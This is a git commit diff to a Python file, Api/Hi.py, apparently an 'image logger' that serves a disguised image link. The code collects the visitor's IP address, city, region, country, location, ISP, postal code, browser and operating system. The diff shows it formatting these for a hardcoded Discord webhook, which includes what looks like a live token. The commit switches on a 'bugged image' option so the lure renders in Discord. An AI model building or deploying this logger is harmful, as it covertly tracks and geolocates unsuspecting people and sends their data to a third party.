8f5f8b6c177db493527e3bce743ed96ecd6e5627
jukjuk95 <jukianfreefree@gmail.com>
2025-11-12 13:48:48 +0100

    Update Hi.py

--- Api/Hi.py
+++ Api/Hi.py
@@ -1,11 +1,12 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
+import requests
 
 webhook = 'https://discord.com/api/webhooks/1437510697620607148/iMSFTjKgcmeMU2oELpJ9gR1iloP939_mk9cwwt1aIix1WszAF-WVN2VBUos1z_KFnyjA'
 
 bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
-buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
+buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
